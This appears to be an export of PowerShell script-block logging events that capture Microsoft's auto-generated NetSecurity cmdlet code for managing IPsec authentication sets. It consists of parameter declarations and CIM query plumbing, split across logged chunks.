    [Parameter(ParameterSetName='cim:CreateInstance0', Mandatory=$true)]
    [ciminstance[]]
    ${Proposal},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [switch]
    ${Default},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PolicyStore')) {
          [object]$__cmdletization_value = ${PolicyStore}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('GPOSession')) {
          [object]$__cmdletization_value = ${GPOSession}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Name')) {
          [object]$__cmdletization_value = ${Name}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisplayName')) {
          [object]$__cmdletization_value = ${DisplayName}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Description')) {
          [object]$__cmdletization_value = ${Description}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Group')) {
          [object]$__cmdletization_value = ${Group}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RuleGroup'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RuleGroup'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Proposal')) {
          [object]$__cmdletization_value = ${Proposal}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Proposals'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Proposals'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Default')) {
          [object]$__cmdletization_value = ${Default}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Default'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Default'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:CreateInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecPhase2AuthSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'New-NetIPsecPhase2AuthSet' -Alias '*'
        

function Get-NetIPsecPhase2AuthSet
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP2AuthSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('Display

ScriptBlock ID: eae1be9a-bbc7-4657-8997-5e4c7169c46a
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (4 of 4):
on_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Rename', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecPhase1AuthSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Rename-NetIPsecPhase1AuthSet' -Alias '*'
        

function Copy-NetIPsecPhase1AuthSet
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecRule},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIKEP1AuthSet')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewPolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewGPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecRule') -and (@('ByAssociatedNetIPsecRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecRule}, 'MSFT_NetConSecRuleMMAuthSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeRule') -and (@('ByAssociatedNetIPsecMainModeRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeRule}, 'MSFT_NetMainModeRuleMMAuthSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewPolicyStore')) {
            [object]$__cmdletization_value = ${NewPolicyStore}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewPolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewPolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewGPOSession')) {
            [object]$__cmdletization_value = ${NewGPOSession}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewGPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewGPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewName')) {
            [object]$__cmdletization_value = ${NewName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
